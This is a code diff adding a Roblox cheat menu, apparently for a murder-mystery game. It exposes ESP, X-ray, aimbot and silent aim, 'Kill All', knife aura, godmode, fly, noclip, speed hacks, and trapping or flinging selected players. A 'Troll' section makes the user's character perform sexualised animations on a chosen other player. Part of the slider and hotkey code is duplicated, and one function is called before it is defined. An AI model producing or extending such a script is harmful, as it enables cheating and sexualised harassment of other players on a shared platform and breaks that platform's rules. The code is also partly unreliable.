+            Notify(\"Dropkick\", \"Ready\", \"Success\", nil, 1)\
+        end)\
+    end\
+    local function toggleRun()\
+        if not runEnabled then\
+            Notify(\"Run\", \"Enable in menu first!\", \"Warning\", nil, 2)\
+            return\
+        end\
+        local char = LocalPlayer.Character\
+        if not char then return end\
+        local hum = char:FindFirstChildOfClass(\"Humanoid\")\
+        if not hum then return end\
+        if runActive then\
+            runActive = false\
+            hum.WalkSpeed = BASE_WALKSPEED\
+            if runAnimConnection then runAnimConnection:Disconnect() end\
+            if runTrack then runTrack:Stop(); runTrack = nil end\
+            Notify(\"Run\", \"Disabled\", \"Info\", nil, 1)\
+        else\
+            runActive = true\
+            hum.WalkSpeed = math.max(0.5, BASE_WALKSPEED * (runSpeedPercent / 100))\
+            local anim = Instance.new(\"Animation\")\
+            anim.AnimationId = RUN_ANIM_ID\
+            runTrack = hum:LoadAnimation(anim)\
+            runTrack.Priority = Enum.AnimationPriority.Action\
+            runTrack.Looped = true\
+            runAnimConnection = RunService.RenderStepped:Connect(function()\
+                local currentHum = char:FindFirstChildOfClass(\"Humanoid\")\
+                if not currentHum or not runTrack then return end\
+                local dropkickIsPlaying = (dropkickTrack and dropkickTrack.IsPlaying)\
+                if currentHum.MoveDirection.Magnitude > 0 and currentHum.FloorMaterial ~= Enum.Material.Air and not dropkickIsPlaying then\
+                    if not runTrack.IsPlaying then runTrack:Play() end\
+                    runTrack:AdjustSpeed(1)\
+                else\
+                    if runTrack.IsPlaying then runTrack:Stop() end\
+                end\
+            end)\
+            Notify(\"Run\", \"Enabled (Speed: \" .. runSpeedPercent .. \"%)\", \"Success\", nil, 2)\
+        end\
+        updateMobileRunButton()\
+    end\
+    local function updateMobileRunButton()\
+        if mobileRunBtn then\
+            local active = runActive\
+            mobileRunBtn.Text = active and \"RUN ON\" or \"RUN OFF\"\
+            mobileRunBtn.BackgroundColor3 = active and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(220, 40, 40)\
+        end\
+    end\
+    local function createMobileButtons()\
+        if mobileGui then return end\
+        if not isMobile then return end\
+        mobileGui = Instance.new(\"ScreenGui\")\
+        mobileGui.Name = \"DropkickMobileUI\"\
+        mobileGui.Parent = LocalPlayer.PlayerGui\
+        mobileGui.ResetOnSpawn = false\
+        mobileGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\
+        mobileGui.DisplayOrder = 100\
+        local function makeButton(text, yOffset, callback, isToggle)\
+            local btn = Instance.new(\"TextButton\")\
+            btn.Size = UDim2.new(0, 75, 0, 75)\
+            btn.Position = UDim2.new(1, -85, 0, yOffset)\
+            btn.BackgroundColor3 = Color3.fromRGB(220, 40, 40)\
+            btn.Text = text\
+            btn.Font = Enum.Font.SourceSansBold\
+            btn.TextColor3 = Color3.new(1,1,1)\
+            btn.TextSize = 14\
+            btn.TextWrapped = true\
+            btn.BorderSizePixel = 0\
+            btn.ZIndex = 10\
+            btn.Active = true\
+            Instance.new(\"UICorner\", btn).CornerRadius = UDim.new(0.2, 0)\
+            btn.Parent = mobileGui\
+            if isToggle then\
+                btn.MouseButton1Click:Connect(function()\
+                    callback()\
+                    updateMobileRunButton()\
+                end)\
+            else\
+                btn.MouseButton1Click:Connect(callback)\
+            end\
+            return btn\
+        end\
+        local runY = 80   \
+        local dropY = 170 \
+        mobileRunBtn = makeButton(\"RUN\", runY, function() toggleRun() end, true)\
+        updateMobileRunButton()\
+        mobileDropkickBtn = makeButton(\"DROP\\nKICK\", dropY, function() activateDropkick() end, false)\
+        if not isMobile then\
+            mobileGui.Enabled = false\
+        end\
+    end\
+    local function setDropkickEnabled(state)\
+        dropkickEnabled = state\
+        if not state then\
+            dropkickActive = false\
+            if dropkickTrack then dropkickTrack:Stop(); dropkickTrack = nil end\
+        end\
+        if mobileDropkickBtn then\
+            mobileDropkickBtn.BackgroundColor3 = state and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(220, 40, 40)\
+        end\
+    end\
+    local function setRunEnabled(state)\
+        runEnabled = state\
+        if not state and runActive then\
+            runActive = false\
+            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass(\"Humanoid\")\
+            if hum then hum.WalkSpeed = BASE_WALKSPEED end\
+            if runAnimConnection then runAnimConnection:Disconnect() end\
+            if runTrack then runTrack:Stop(); runTrack = nil end\
+            updateMobileRunButton()\
+        end\
+        if mobileRunBtn then\
+            mobileRunBtn.BackgroundColor3 = state and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(220, 40, 40)\
+        end\
+    end\
+    local dropkickHotkey = Enum.KeyCode.K\
+    local runHotkey = Enum.KeyCode.J\
+    local dropkickHotkeyConn, runHotkeyConn\
+    if _G.dropkickHotkeyConn then _G.dropkickHotkeyConn:Disconnect() end\
+    if _G.runHotkeyConn then _G.runHotkeyConn:Disconnect() end\
+    _G.dropkickHotkeyConn = UserInputService.InputBegan:Connect(function(input, gp)\
+        if gp then return end\
+        if input.KeyCode == dropkickHotkey and dropkickEnabled then\
+            activateDropkick()\
+        elseif input.KeyCode == runHotkey and runEnabled then\
+            toggleRun()\
+        end\
+    end)\
+    LocalPlayer.CharacterAdded:Connect(function()\
+        dropkickBusy = false\
+        dropkickActive = false\
+        runActive = false\
+        if dropkickTrack then dropkickTrack:Stop(); dropkickTrack = nil end\
+        if runTrack then runTrack:Stop(); runTrack = nil end\
+        if runAnimConnection then runAnimConnection:Disconnect(); runAnimConnection = nil end\
+        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass(\"Humanoid\")\
+        if hum then hum.WalkSpeed = BASE_WALKSPEED end\
+        if mobileRunBtn then updateMobileRunButton() end\
+    end)\
+    _G.Dropkick = {\
+        activate = activateDropkick,\
+        toggleRun = toggleRun,\
+        getPower = function() return dropkickPower end,\
+        setPower = function(v) dropkickPower = v end,\
+        getRunSpeed = function() return runSpeedPercent end,\
+        setRunSpeed = function(v) runSpeedPercent = v end,\
+        getDropkickHotkey = function() return dropkickHotkey end,\
+        setDropkickHotkey = function(key) dropkickHotkey = key end,\
+        getRunHotkey = function() return runHotkey end,\
+        setRunHotkey = function(key) runHotkey = key end,\
+        isRunActive = function() return runActive end,\
+        setDropkickEnabled = setDropkickEnabled,\
+        setRunEnabled = setRunEnabled,\
+        isDropkickEnabled = function() return dropkickEnabled end,\
+        isRunEnabled = function() return runEnabled end,\
+        createMobileButtons = createMobileButtons,\
+        updateMobileRunButton = updateMobileRunButton,\
+    }\
+    if isMobile then\
+        task.spawn(function()\
+            task.wait(0.3)\
+            if _G.Dropkick and _G.Dropkick.createMobileButtons then\
+                _G.Dropkick.createMobileButtons()\
+            end\
+        end)\
+    end\
+end\
+local Tabs = {}\
+Tabs.Main = Window:AddTab({ Title = \"Main\", Icon = \"home\" })\
+Tabs.Visuals = Window:AddTab({ Title = \"Visuals\", Icon = \"eye\" })\
+Tabs.Combat = Window:AddTab({ Title = \"Combat\", Icon = \"crosshair\" })\
+Tabs.Player = Window:AddTab({ Title = \"Player\", Icon = \"user\" })\
+Tabs.AutoFarm = Window:AddTab({ Title = \"Farm\", Icon = \"coins\" })\
+Tabs.Whitelist = Window:AddTab({ Title = \"Whitelist\", Icon = \"shield\" })\
+Tabs.Emotes = Window:AddTab({ Title = \"Emotes\", Icon = \"smile\" })\
+Tabs.Teleport = Window:AddTab({ Title = \"Teleport\", Icon = \"map-pin\" })\
+Tabs.Misc = Window:AddTab({ Title = \"Misc\", Icon = \"wrench\" })\
+Tabs.Atmosphere = Window:AddTab({ Title = \"Atmosphere\", Icon = \"cloud\" })\
+Tabs.Credits = Window:AddTab({ Title = \"Credits\", Icon = \"info\" })\
+Tabs.Credits:AddParagraph({\
+    Title = \"Credits\",\
+    Content = \"Made by @skittlelol1 in Discord\\nthat's all..\"\
+})\
+Tabs.Settings = Window:AddTab({ Title = \"Settings\", Icon = \"settings\" })\
+local protSec = Tabs.Main:AddCollapsibleSection(\"Protection\", \"lucide/shield\", true)\
+protSec:AddToggle(\"AntiFling\", { Title = \"Anti-Fling (Enhanced)\", Default = false, Callback = function(v)\
+    toggleAntiFling(v)\
+    saveSettings()\
+end })\
+protSec:AddToggle(\"AntiTrap\", { Title = \"Anti-Trap\", Default = false, Callback = function(v)\
+    toggleAntiTrap(v)\
+    saveSettings()\
+end })\
+local trollSec = Tabs.Main:AddCollapsibleSection(\"Troll\", \"lucide/party-popper\", true)\
+local jerkSpeed = 1.8\
+local jerkAnimTrack = nil\
+local jerking = false\
+trollSec:AddButton({\
+    Title = \"Give Jerk Tool\",\
+    Callback = function()\
+        local plr = LocalPlayer\
+        local bp = plr:FindFirstChild(\"Backpack\") or plr:WaitForChild(\"Backpack\")\
+        if bp:FindFirstChild(\"Jerk\") then\
+            bp.Jerk:Destroy()\
+        end\
+        local tool = Instance.new(\"Tool\")\
+        tool.Name = \"Jerk\"\
+        tool.RequiresHandle = false\
+        tool.Parent = bp\
+        tool.Equipped:Connect(function()\
+            jerking = true\
+            local char = plr.Character\
+            if not char then return end\
+            local hum = char:FindFirstChildOfClass(\"Humanoid\")\
+            if not hum then return end\
+            local animator = hum:FindFirstChildOfClass(\"Animator\") or Instance.new(\"Animator\", hum)\
+            local anim = Instance.new(\"Animation\")\
+            anim.AnimationId = \"rbxassetid://698251653\"\
+            jerkAnimTrack = animator:LoadAnimation(anim)\
+            task.spawn(function()\
+                while jerking and jerkAnimTrack do\
+                    jerkAnimTrack:Play()\
+                    jerkAnimTrack:AdjustSpeed(jerkSpeed)\
+                    jerkAnimTrack.TimePosition = 0.4\
+                    task.wait(0.1)\
+                end\
+            end)\
+        end)\
+        tool.Unequipped:Connect(function()\
+            jerking = false\
+            if jerkAnimTrack then\
+                jerkAnimTrack:Stop()\
+                jerkAnimTrack = nil\
+            end\
+        end)\
+        Notify(\"Jerk\", \"Tool added to backpack\", \"Success\", nil, 2)\
+    end\
+})\
+trollSec:AddSlider(\"JerkSpeedSlider\", {\
+    Title = \"Jerk Speed\",\
+    Min = 0.5,\
+    Max = 5,\
+    Default = 1.8,\
+    Rounding = 0.1,\
+    Callback = function(v)\
+        jerkSpeed = v\
+        if jerkAnimTrack and jerkAnimTrack.IsPlaying then\
+            jerkAnimTrack:AdjustSpeed(v)\
+        end\
+    end\
+})\
+trollSec:AddDivider()\
+local bangTarget = nil\
+local bangSpeed = 1.8\
+local isBanging = false\
+local bangAnimTrack = nil\
+local bangFollowConn = nil\
+local function updateBangPlayerList()\
+    local names = {}\
+    for _, plr in ipairs(Players:GetPlayers()) do\
+        if plr ~= LocalPlayer then\
+            table.insert(names, plr.Name)\
+        end\
+    end\
+    return names\
+end\
+local bangDropdown = trollSec:AddDropdown(\"BangTargetDropdown\", {\
+    Title = \"Select Target for Bang\",\
+    Values = updateBangPlayerList(),\
+    Default = \"\",\
+    Multi = false,\
+    Callback = function(v)\
+        bangTarget = v\
+    end\
+})\
+trollSec:AddButton({\
+    Title = \"Refresh Players\",\
+    Callback = function()\
+        local newList = updateBangPlayerList()\
+        pcall(function()\
+            bangDropdown:SetValues(newList)\
+            if #newList > 0 then\
+                bangDropdown:SetValue(newList[1])\
+                bangTarget = newList[1]\
+            end\
+        end)\
+        Notify(\"Refresh\", \"Player list updated\", \"Info\", nil, 2)\
+    end\
+})\
+trollSec:AddButton({\
+    Title = \"Bang Front + Follow\",\
+    Callback = function()\
+        if not bangTarget then\
+            Notify(\"Error\", \"Select a player first!\", \"Error\", nil, 2)\
+            return\
+        end\
+        local target = Players:FindFirstChild(bangTarget)\
+        if not target or not target.Character then\
+            Notify(\"Error\", \"Player not found or has no character\", \"Error\", nil, 2)\
+            return\
+        end\
+        local myChar = LocalPlayer.Character\
+        local myRoot = myChar and myChar:FindFirstChild(\"HumanoidRootPart\")\
+        if not myRoot then\
+            Notify(\"Error\", \"You don't have a character\", \"Error\", nil, 2)\
+            return\
+        end\
+        isBanging = false\
+        if bangFollowConn then bangFollowConn:Disconnect() end\
+        if bangAnimTrack then bangAnimTrack:Stop() end\
+        isBanging = true\
+        Notify(\"Bang\", \"Started on \" .. target.Name, \"Info\", nil, 2)\
+        bangFollowConn = RunService.Heartbeat:Connect(function()\
+            if not isBanging then return end\
+            local tChar = target.Character\
+            local mChar = LocalPlayer.Character\
+            if tChar and mChar and tChar:FindFirstChild(\"HumanoidRootPart\") and mChar:FindFirstChild(\"HumanoidRootPart\") then\
+                local tRoot = tChar.HumanoidRootPart\
+                local mRoot = mChar.HumanoidRootPart\
+                mRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0.2, 1.1)\
+            end\
+        end)\
+        local hum = myChar:FindFirstChildOfClass(\"Humanoid\")\
+        if hum then\
+            local animator = hum:FindFirstChildOfClass(\"Animator\") or Instance.new(\"Animator\", hum)\
+            local anim = Instance.new(\"Animation\")\
+            anim.AnimationId = \"rbxassetid://5918726674\"\
+            bangAnimTrack = animator:LoadAnimation(anim)\
+            task.spawn(function()\
+                while isBanging and bangAnimTrack do\
+                    bangAnimTrack:Play()\
+                    bangAnimTrack:AdjustSpeed(bangSpeed)\
+                    task.wait(0.08)\
+                end\
+            end)\
+        end\
+    end\
+})\
+trollSec:AddSlider(\"BangSpeedSlider\", {\
+    Title = \"Bang Speed\",\
+    Min = 0.5,\
+    Max = 6,\
+    Default = 1.8,\
+    Rounding = 0.1,\
+    Callback = function(v)\
+        bangSpeed = v\
+        if bangAnimTrack and bangAnimTrack.IsPlaying then\
+            bangAnimTrack:AdjustSpeed(v)\
+        end\
+    end\
+})\
+trollSec:AddButton({\
+    Title = \"Stop Bang\",\
+    Callback = function()\
+        isBanging = false\
+        if bangFollowConn then\
+            bangFollowConn:Disconnect()\
+            bangFollowConn = nil\
+        end\
+        if bangAnimTrack then\
+            bangAnimTrack:Stop()\
+            bangAnimTrack = nil\
+        end\
+        Notify(\"Bang\", \"Stopped\", \"Info\", nil, 2)\
+    end\
+})\
+Tabs.Main:AddDivider()\
+Tabs.Main:AddSection(\"Dropkick & Run\")\
+Tabs.Main:AddToggle(\"DropkickToggle\", {\
+    Title = \"Dropkick (Enable)\",\
+    Default = false,\
+    Callback = function(v)\
+        if _G.Dropkick then\
+            _G.Dropkick.setDropkickEnabled(v)\
+        end\
+        saveSettings()\
+    end\
+})\
+Tabs.Main:AddToggle(\"RunToggle\", {\
+    Title = \"Run (Enable)\",\
+    Default = false,\
+    Callback = function(v)\
+        if _G.Dropkick then\
+            _G.Dropkick.setRunEnabled(v)\
+        end\
+        saveSettings()\
+    end\
+})\
+Tabs.Main:AddDivider()\
+Tabs.Main:AddSlider(\"DropkickPowerSlider\", {\
+    Title = \"Dropkick Power\",\
+    Min = 0,\
+    Max = 1000,\
+    Default = 50,\
+    Rounding = 0,\
+    Callback = function(v)\
+        if _G.Dropkick then _G.Dropkick.setPower(v) end\
+    end\
+})\
+Tabs.Main:AddButton({\
+    Title = \"Activate Dropkick (K)\",\
+    Callback = function()\
+        if _G.Dropkick then _G.Dropkick.activate() end\
+    end\
+})\
+Tabs.Main:AddButton({\
+    Title = \"Set Dropkick Hotkey (Current: K)\",\
+    Callback = function()\
+        if not _G.Dropkick then return end\
+        local current = _G.Dropkick.getDropkickHotkey()\
+        Notify(\"Hotkey\", \"Press any key...\", \"Info\", nil, 3)\
+        local conn\
+        conn = UserInputService.InputBegan:Connect(function(input, gp)\
+            if gp then return end\
+            if input.KeyCode ~= Enum.KeyCode.Unknown then\
+                _G.Dropkick.setDropkickHotkey(input.KeyCode)\
+                pcall(function()\
+                    for _, child in pairs(Tabs.Main:GetChildren()) do\
+                        if child:IsA(\"TextButton\") and child.Title == \"Set Dropkick Hotkey (Current: \" .. current.Name .. \")\" then\
+                            child.Title = \"Set Dropkick Hotkey (Current: \" .. input.KeyCode.Name .. \")\"\
+                        end\
+                    end\
+                end)\
+                conn:Disconnect()\
+                Notify(\"Hotkey\", \"Dropkick hotkey set to \" .. input.KeyCode.Name, \"Success\", nil, 2)\
+            end\
+        end)\
+    end\
+})\
+Tabs.Main:AddDivider()\
+Tabs.Main:AddSlider(\"RunSpeedSlider\", {\
+    Title = \"Run Speed %\",\
+    Min = 0,\
+    Max = 500,\
+    Default = 20,\
+    Rounding = 0,\
+    Callback = function(v)\
+        if _G.Dropkick then\
+            _G.Dropkick.setRunSpeed(v)\
+            if _G.Dropkick.isRunActive() then\
+                local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass(\"Humanoid\")\
+                if hum then\
+                    hum.WalkSpeed = math.max(0.5, 16 * (v / 100))\
+                end\
+            end\
+        end\
+    end\
+})\
+Tabs.Main:AddButton({\
+    Title = \"Toggle Run (J)\",\
+    Callback = function()\
+        if _G.Dropkick then _G.Dropkick.toggleRun() end\
+    end\
+})\
+Tabs.Main:AddButton({\
+    Title = \"Set Run Hotkey (Current: J)\",\
+    Callback = function()\
+        if not _G.Dropkick then return end\
+        local current = _G.Dropkick.getRunHotkey()\
+        Notify(\"Hotkey\", \"Press any key...\", \"Info\", nil, 3)\
+        local conn\
+        conn = UserInputService.InputBegan:Connect(function(input, gp)\
+            if gp then return end\
+            if input.KeyCode ~= Enum.KeyCode.Unknown then\
+                _G.Dropkick.setRunHotkey(input.KeyCode)\
+                pcall(function()\
+                    for _, child in pairs(Tabs.Main:GetChildren()) do\
+                        if child:IsA(\"TextButton\") and child.Title == \"Set Run Hotkey (Current: \" .. current.Name .. \")\" then\
+                            child.Title = \"Set Run Hotkey (Current: \" .. input.KeyCode.Name .. \")\"\
+                        end\
+                    end\
+                end)\
+                conn:Disconnect()\
+                Notify(\"Hotkey\", \"Run hotkey set to \" .. input.KeyCode.Name, \"Success\", nil, 2)\
+            end\
+        end)\
+    end\
+})\
+Tabs.Main:AddDivider()\
+Tabs.Main:AddSlider(\"RunSpeedSlider\", {\
+    Title = \"Run Speed %\",\
+    Min = 0,\
+    Max = 500,\
+    Default = 20,\
+    Rounding = 0,\
+    Callback = function(v)\
+        if _G.Dropkick then\
+            _G.Dropkick.setRunSpeed(v)\
+            if _G.Dropkick.isRunActive() then\
+                local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass(\"Humanoid\")\
+                if hum then\
+                    hum.WalkSpeed = math.max(0.5, 16 * (v / 100))\
+                end\
+            end\
+        end\
+    end\
+})\
+Tabs.Main:AddButton({\
+    Title = \"Toggle Run (J)\",\
+    Callback = function()\
+        if _G.Dropkick then _G.Dropkick.toggleRun() end\
+    end\
+})\
+Tabs.Main:AddButton({\
+    Title = \"Set Run Hotkey (Current: J)\",\
+    Callback = function()\
+        if not _G.Dropkick then return end\
+        local current = _G.Dropkick.getRunHotkey()\
+        Notify(\"Hotkey\", \"Press any key...\", \"Info\", nil, 3)\
+        local conn\
+        conn = UserInputService.InputBegan:Connect(function(input, gp)\
+            if gp then return end\
+            if input.KeyCode ~= Enum.KeyCode.Unknown then\
+                _G.Dropkick.setRunHotkey(input.KeyCode)\
+                pcall(function()\
+                    for _, child in pairs(Tabs.Main:GetChildren()) do\
+                        if child:IsA(\"TextButton\") and child.Title == \"Set Run Hotkey (Current: \" .. current.Name .. \")\" then\
+                            child.Title = \"Set Run Hotkey (Current: \" .. input.KeyCode.Name .. \")\"\
+                        end\
+                    end\
+                end)\
+                conn:Disconnect()\
+                Notify(\"Hotkey\", \"Run hotkey set to \" .. input.KeyCode.Name, \"Success\", nil, 2)\
+            end\
+        end)\
+    end\
+})\
+local espSec = Tabs.Visuals:AddCollapsibleSection(\"ESP Settings\", \"lucide/eye\", true)\
+espSec:AddToggle(\"EspMaster\", { Title = \"Enable ESP\", Default = false, Callback = function(v)\
+    _G.EspEnabled = v\
+    if not v then clearESP() end\
+    saveSettings()\
+end })\
+espSec:AddToggle(\"NamesESPToggle\", { Title = \"Player Names\", Default = false, Callback = function(v)\
+    _G.NamesESP = v\
+    saveSettings()\
+end })\
+espSec:AddToggle(\"GunEspToggle\", { Title = \"Show Dropped Guns\", Default = false, Callback = function(v)\
+    _G.GunEspEnabled = v\
+    saveSettings()\
+end })\
+espSec:AddToggle(\"TrapESPToggle\", { Title = \"Show Traps\", Default = false, Callback = function(v)\
+    _G.TrapESP = v\
+    saveSettings()\
+    for _, obj in ipairs(workspace:GetDescendants()) do\
+        if obj.Name == \"TrapVisual\" and obj:IsA(\"BasePart\") then\
+            obj.Transparency = v and 0 or (obj:GetAttribute(\"OriginalTransparency\") or 1)\
+            if not v then obj:SetAttribute(\"OriginalTransparency\", nil) else obj:SetAttribute(\"OriginalTransparency\", obj.Transparency) end\
+        end\
+    end\
+end })\
+Tabs.Visuals:AddDivider()\
+local camSec = Tabs.Visuals:AddCollapsibleSection(\"Camera\", \"lucide/camera\", true)\
+camSec:AddSlider(\"FOV\", { Title = \"FOV\", Min=30, Max=120, Default=70, Rounding=0, Callback = function(v)\
+    _G.FOVValue = v\
+    Camera.FieldOfView = v\
+    saveSettings()\
+end })\
+camSec:AddToggle(\"XrayToggle\", { Title = \"X-Ray\", Default = false, Callback = function(v)\
+    toggleXray(v)\
+    saveSettings()\
+end })\
+Tabs.Visuals:AddDivider()\
+local visMods = Tabs.Visuals:AddCollapsibleSection(\"Visual Mods\", \"lucide/brush\", true)\
+visMods:AddToggle(\"ImproveFPS\", { Title = \"Improve FPS (Enhanced)\", Default = false, Callback = function(v)\
+    toggleImproveFPS(v)\
+    saveSettings()\
+end })\
+visMods:AddToggle(\"KorbloxToggle\", { Title = \"Korblox Leg\", Default = false, Callback = function(v)\
+    toggleKorblox(v)\
+    saveSettings()\
+end })\
+visMods:AddToggle(\"HeadlessToggle\", { Title = \"Headless\", Default = false, Callback = function(v)\
+    toggleHeadless(v)\
+    saveSettings()\
+end })\
+visMods:AddButton({ Title = \"Give Boombox\", Callback = giveBoombox })\
+local sheriffSec = Tabs.Combat:AddCollapsibleSection(\"Sheriff (Gun)\", \"lucide/crosshair\", true)\
+sheriffSec:AddToggle(\"SilentAimToggle\", { Title = \"Silent Aim (PC)\", Default = false, Callback = function(v)\
+    _G.SilentAimEnabled = v\
+    setupPCKeybind()\
+    saveSettings()\
+end })\
+sheriffSec:AddKeybind(\"SilentAimKeybind\", { Title = \"Silent Aim Key\", Default = \"E\", Callback = function(key)\
+    _G.SilentAimKey = key\
+    setupPCKeybind()\
+    saveSettings()\
+end })\
+sheriffSec:AddToggle(\"SilentAimMobileToggle\", { Title = \"Silent Aim (Mobile)\", Default = false, Callback = function(v)\
+    _G.SilentAimMobile = v\
+    if v then createMobileButton() else removeMobileButton() end\
+    saveSettings()\
+end })\
+sheriffSec:AddToggle(\"AimbotToggle\", { Title = \"Aimbot (Sheriff)\", Default = false, Callback = function(v)\
+    toggleAimbot(v)\
+    saveSettings()\
+end })\
+sheriffSec:AddKeybind(\"AimbotKeybind\", { Title = \"Aimbot Key\", Default = \"Q\", Callback = function(key)\
+    _G.AimbotKey = key\
+    saveSettings()\
+end })\
+local murdererSec = Tabs.Combat:AddCollapsibleSection(\"Murderer (Knife)\", \"lucide/sword\", true)\
+murdererSec:AddButton({ Title = \"Kill All\", Callback = killAll })\
+murdererSec:AddToggle(\"KnifeAuraToggle\", { Title = \"Knife Aura\", Default = false, Callback = function(v)\
+    toggleKnifeAura(v)\
+    saveSettings()\
+end })\
+murdererSec:AddSlider(\"KnifeAuraRange\", { Title = \"Aura Range\", Min=5, Max=100, Default=20, Rounding=0, Callback = function(v)\
+    _G.KnifeAuraRange = v\
+    saveSettings()\
+end })\
+murdererSec:AddToggle(\"KnifeSilentAimPCToggle\", { Title = \"Knife Silent Aim (PC)\", Default = false, Callback = function(v)\
+    _G.KnifeSilentAimEnabled = v\
+    saveSettings()\
+end })\
+murdererSec:AddKeybind(\"KnifeSilentAimPCKeybind\", { Title = \"Keybind\", Default = \"R\", Callback = function(key)\
+    _G.KnifeSilentAimKey = key\
+    saveSettings()\
+end })\
+murdererSec:AddToggle(\"KnifeSilentAimMobileToggle\", { Title = \"Knife Silent Aim (Mobile)\", Default = false, Callback = function(v)\
+    _G.KnifeMobileEnabled = v\
+    if v then\
+        createMobileKnifeButton()\
+    else\
+        removeMobileKnifeButton()\
+    end\
+    saveSettings()\
+end })\
+murdererSec:AddButton({ Title = \"Create Fake Knife\", Callback = createFakeKnife })\
+local commonSec = Tabs.Combat:AddCollapsibleSection(\"General\", \"lucide/star\", true)\
+commonSec:AddButton({ Title = \"Godmode\", Callback = godmode })\
+local trapSec = Tabs.Combat:AddCollapsibleSection(\"Trap\", \"lucide/trap\", true)\
+local trapDropdown = trapSec:AddDropdown(\"TrapTarget\", { Title = \"Target\", Values = getPlayersNames(), Default = \"\" })\
+trapSec:AddButton({ Title = \"Trap Selected\", Callback = function()\
+    local name = trapDropdown.Value\
+    if name and name ~= \"\" then\
+        local plr = Players:FindFirstChild(name)\
+        if plr then trapPlayer(plr) end\
+    end\
+end })\
+local moveSec = Tabs.Player:AddCollapsibleSection(\"Movement\", \"lucide/activity\", true)\
+moveSec:AddSlider(\"WalkSpeed\", { Title = \"Walk Speed\", Min=16, Max=200, Default=16, Rounding=0, Callback = function(v)\
+    _G.WalkSpeed = v\
+    updateMovement()\
+    saveSettings()\
+end })\
+moveSec:AddSlider(\"JumpPower\", { Title = \"Jump Power\", Min=50, Max=300, Default=50, Rounding=0, Callback = function(v)\
+    _G.JumpPower = v\
+    updateMovement()\
+    saveSettings()\
+end })\
+moveSec:AddToggle(\"SpeedGlitch\", { Title = \"Speed Glitch\", Default = false, Callback = function(v)\
+    _G.SpeedGlitchEnabled = v\
+    saveSettings()\
+end })\
+moveSec:AddSlider(\"GlitchSpeed\", { Title = \"Glitch Speed\", Min=16, Max=300, Default=35, Rounding=0, Callback = function(v)\
+    _G.GlitchSpeed = v\
+    saveSettings()\
+end })\
+Tabs.Player:AddDivider()\
+local flySec = Tabs.Player:AddCollapsibleSection(\"Fly & Noclip\", \"lucide/plane\", true)\
+flySec:AddToggle(\"Fly\", { Title = \"Fly\", Default = false, Callback = function(v)\
+    toggleFly(v)\
+    saveSettings()\
+end })\
+flySec:AddSlider(\"FlySpeed\", { Title = \"Fly Speed\", Min=10, Max=200, Default=50, Rounding=0, Callback = function(v)\
+    _G.FlySpeed = v\
+    saveSettings()\
+end })\
+flySec:AddToggle(\"Noclip\", { Title = \"Noclip\", Default = false, Callback = function(v)\
+    toggleNoclip(v)\
+    saveSettings()\
+end })\
+Tabs.Player:AddDivider()\
+local flingSec = Tabs.Player:AddCollapsibleSection(\"Fling\", \"lucide/rocket\", true)\
+local flingDropdown = flingSec:AddDropdown(\"FlingTarget\", { Title = \"Target\", Values = getPlayersNames(), Default = \"\" })\
+flingSec:AddButton({ Title = \"Refresh Players\", Callback = function()\
+    local names = getPlayersNames()\
+    flingDropdown:SetValues(names)\
+    flingDropdown:SetValue(nil)\
+    Notify(\"Refresh\", \"Player list updated\", \"Info\", nil, 2)\
+end })\
+flingSec:AddButton({ Title = \"Fling Selected (Enhanced)\", Callback = function()\
+    local name = flingDropdown.Value\
+    if not name or name == \"\" then\
+        Notify(\"Error\", \"Select a player\", \"Error\", nil, 2)\
+        return\
+    end\
+    local pl = Players:FindFirstChild(name)\
+    if not pl then return end\
+    if isWhitelisted(pl) then Notify(\"Error\", \"Player is whitelisted\", \"Error\", nil, 2) return end\
+    FlingActive = true\
+    task.spawn(function()\
+        flingPlayer(pl)\
+        FlingActive = false\
+    end)\
+end })\
+flingSec:AddButton({ Title = \"Fling Murderer\", Callback = function()\
+    flingRole(\"Murderer\")\
+end })\
+flingSec:AddButton({ Title = \"Fling Sheriff\", Callback = function()\
+    flingRole(\"Sheriff\")\
+end })\
+flingSec:AddButton({ Title = \"Stop Fling\", Callback = function()\
+    FlingActive = false\
+end })\
+flingSec:AddToggle(\"ExtremeFlingToggle\", {\
+    Title = \"Touch fling\",\
+    Default = false,\
+    Callback = function(v)\
+        _G.ExtremeFlingEnabled = v\
+        toggleExtremeFling(v)\
+        saveSettings()\
+    end\
+})\
+Tabs.Player:AddDivider()\
+local glitchSec = Tabs.Player:AddCollapsibleSection(\"Easy Glitching\", \"lucide/wand\", true)\
+glitchSec:AddToggle(\"EasyGlitchToggle\", { Title = \"Easy Glitching\", Default = false, Callback = function(v)\
+    _G.EasyGlitch = v\
+    easyGlitchSetup(v)\
+    saveSettings()\
+end })\
+local fakeSec = Tabs.Player:AddCollapsibleSection(\"Fake Die\", \"lucide/skull\", true)\
+fakeSec:AddButton({ Title = \"Lay On Back\", Callback = layDown })\
+fakeSec:AddButton({ Title = \"Sit Down\", Callback = sitDown })\
+Tabs.Player:AddDivider()\
+local extraPlayerSec = Tabs.Player:AddCollapsibleSection(\"Extra\", \"lucide/plus\", true)\
+extraPlayerSec:AddToggle(\"SpectateToggle\", { Title = \"Enable Spectate\", Default = false, Callback = function(v)\
+    spectateEnabled = v\
+    if not v then\
+        Camera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass(\"Humanoid\")\
+        Notify(\"Spectate\", \"Spectate disabled\", \"Info\", nil, 2)\
+    end\
+    saveSettings()\
+end })\
+spectateDropdown = extraPlayerSec:AddDropdown(\"SpectateTarget\", {\
+    Title = \"Spectate Player\",\
+    Values = getPlayersNames(),\
+    Default = \"\",\
+    Multi = false,\
+    Callback = function(v)\
+        startSpectate(v)\
+    end\
+})\
+extraPlayerSec:AddButton({ Title = \"Refresh Spectate List\", Callback = function()\
+    updateSpectateList()\
+end })\
+extraPlayerSec:AddToggle(\"CTRL+Click Teleport (PC)\", { Title = \"Enable\", Default = false, Callback = function(v)\
+    ctrlClickTP = v\
+    saveSettings()\
+end })\
+extraPlayerSec:AddButton({ Title = \"Send Sheriff & Murderer names to chat\", Callback = sendRoleNames })\
+Tabs.AutoFarm:AddSection(\"Coin Farm\")\
